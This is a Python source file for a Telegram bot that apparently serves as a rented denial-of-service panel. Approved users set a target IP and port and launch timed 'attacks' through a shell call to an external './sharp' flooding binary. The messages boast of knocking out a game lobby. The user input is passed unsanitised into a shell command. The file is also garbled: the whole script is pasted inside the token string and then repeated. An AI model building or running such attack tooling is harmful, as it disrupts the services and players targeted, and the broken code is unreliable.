import asyncio
import signal
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = 'import asyncio
import signal
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
ADMIN_USER_ID = 5817935431
USERS_FILE = 'users.txt'
attack_in_progress = False
attack_process = None
attack_paused = False
current_ip = None
current_port = None
default_duration = 600  # Default duration in seconds

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the SHARP PUBLIC🔥*\n\n"
        "*Use /set <ip> <port>* to set the default IP and port.\n"
        "*Use /attack <duration>* to launch an attack with the set IP and port (default is 600 seconds).\n"
        "*Quick commands: /10, /20, /30 for 10, 20, and 30 seconds.*\n"
        "*Control commands: /pause, /resume, /stop.*\n"
        "*Let Start Fucking ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def set_ip_port(update: Update, context: CallbackContext):
    global current_ip, current_port
    if update.effective_chat.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /set <ip> <port>*", parse_mode='Markdown')
        return

    current_ip, current_port = context.args
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✔️ IP set to {current_ip} and Port set to {current_port}.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_process, attack_paused

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if current_ip is None or current_port is None:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please set the IP and Port using /set before starting an attack.*", parse_mode='Markdown')
        return

    # Get the duration from the arguments or use the default duration
    duration = context.args[0] if context.args else str(default_duration)
    
    await context.bot.send_message(chat_id=chat_id, text=(f"*⚔️ Attack Launched! ⚔️*\n*🎯 Target: {current_ip}:{current_port}*\n*🕒 Duration: {duration} seconds*\n*🔥 Enjoy And Fuck Whole Lobby  💥*"), parse_mode='Markdown')

    attack_in_progress = True
    attack_process = await asyncio.create_subprocess_shell(
        f"./sharp {current_ip} {current_port} {duration}",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    while True:
        if attack_paused:
            # Sleep until the attack is resumed
            await asyncio.sleep(1)
            continue

        stdout, stderr = await attack_process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
        break

    attack_in_progress = False
    attack_process = None  # Reset the attack process
    await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our SHARP PUBLIC!*", parse_mode='Markdown')

async def quick_duration(update: Update, context: CallbackContext):
    duration_mapping = {
        '/10': 10,
        '/20': 20,
        '/30': 30,
    }
    command = update.message.text.strip()

    if command in duration_mapping:
        # Automatically call the attack function with the specified duration
        context.args = [str(duration_mapping[command])]
        await attack(update, context)
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Invalid quick command.*", parse_mode='Markdown')

async def pause(update: Update, context: CallbackContext):
    global attack_paused
    if attack_in_progress and not attack_paused:
        attack_paused = True
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⏸️ Attack Paused!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No active attack to pause.*", parse_mode='Markdown')

async def resume(update: Update, context: CallbackContext):
    global attack_paused
    if attack_in_progress and attack_paused:
        attack_paused = False
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*▶️ Attack Resumed!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No paused attack to resume.*", parse_mode='Markdown')

async def stop(update: Update, context: CallbackContext):
    global attack_process, attack_in_progress
    if attack_process:
        attack_process.terminate()
        await attack_process.wait()  # Ensure the process is cleaned up
        attack_process = None
        attack_in_progress = False
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🛑 Attack Stopped!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No active attack to stop.*", parse_mode='Markdown')

async def sharp(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /sharp <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("set", set_ip_port))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("10", quick_duration))
    application.add_handler(CommandHandler("20", quick_duration))
    application.add_handler(CommandHandler("30", quick_duration))
    application.add_handler(CommandHandler("pause", pause))
    application.add_handler(CommandHandler("resume", resume))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("sharp", sharp))
    application.run_polling()

if __name__ == '__main__':
    main()
'
ADMIN_USER_ID = 5817935431
USERS_FILE = 'users.txt'
attack_in_progress = False
attack_process = None
attack_paused = False
current_ip = None
current_port = None
default_duration = 600  # Default duration in seconds

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the SHARP PUBLIC🔥*\n\n"
        "*Use /set <ip> <port>* to set the default IP and port.\n"
        "*Use /attack <duration>* to launch an attack with the set IP and port (default is 600 seconds).\n"
        "*Quick commands: /10, /20, /30 for 10, 20, and 30 seconds.*\n"
        "*Control commands: /pause, /resume, /stop.*\n"
        "*Let Start Fucking ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def set_ip_port(update: Update, context: CallbackContext):
    global current_ip, current_port
    if update.effective_chat.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /set <ip> <port>*", parse_mode='Markdown')
        return

    current_ip, current_port = context.args
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✔️ IP set to {current_ip} and Port set to {current_port}.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_process, attack_paused

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if current_ip is None or current_port is None:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please set the IP and Port using /set before starting an attack.*", parse_mode='Markdown')
        return

    # Get the duration from the arguments or use the default duration
    duration = context.args[0] if context.args else str(default_duration)
    
    await context.bot.send_message(chat_id=chat_id, text=(f"*⚔️ Attack Launched! ⚔️*\n*🎯 Target: {current_ip}:{current_port}*\n*🕒 Duration: {duration} seconds*\n*🔥 Enjoy And Fuck Whole Lobby  💥*"), parse_mode='Markdown')

    attack_in_progress = True
    attack_process = await asyncio.create_subprocess_shell(
        f"./sharp {current_ip} {current_port} {duration}",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    while True:
        if attack_paused:
            # Sleep until the attack is resumed
            await asyncio.sleep(1)
            continue

        stdout, stderr = await attack_process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
        break

    attack_in_progress = False
    attack_process = None  # Reset the attack process
    await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our SHARP PUBLIC!*", parse_mode='Markdown')

async def quick_duration(update: Update, context: CallbackContext):
    duration_mapping = {
        '/10': 10,
        '/20': 20,
        '/30': 30,
    }
    command = update.message.text.strip()

    if command in duration_mapping:
        # Automatically call the attack function with the specified duration
        context.args = [str(duration_mapping[command])]
        await attack(update, context)
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Invalid quick command.*", parse_mode='Markdown')

async def pause(update: Update, context: CallbackContext):
    global attack_paused
    if attack_in_progress and not attack_paused:
        attack_paused = True
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⏸️ Attack Paused!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No active attack to pause.*", parse_mode='Markdown')

async def resume(update: Update, context: CallbackContext):
    global attack_paused
    if attack_in_progress and attack_paused:
        attack_paused = False
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*▶️ Attack Resumed!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No paused attack to resume.*", parse_mode='Markdown')

async def stop(update: Update, context: CallbackContext):
    global attack_process, attack_in_progress
    if attack_process:
        attack_process.terminate()
        await attack_process.wait()  # Ensure the process is cleaned up
        attack_process = None
        attack_in_progress = False
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🛑 Attack Stopped!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No active attack to stop.*", parse_mode='Markdown')

async def sharp(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /sharp <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("set", set_ip_port))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("10", quick_duration))
    application.add_handler(CommandHandler("20", quick_duration))
    application.add_handler(CommandHandler("30", quick_duration))
    application.add_handler(CommandHandler("pause", pause))
    application.add_handler(CommandHandler("resume", resume))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("sharp", sharp))
    application.run_polling()

if __name__ == '__main__':
    main()
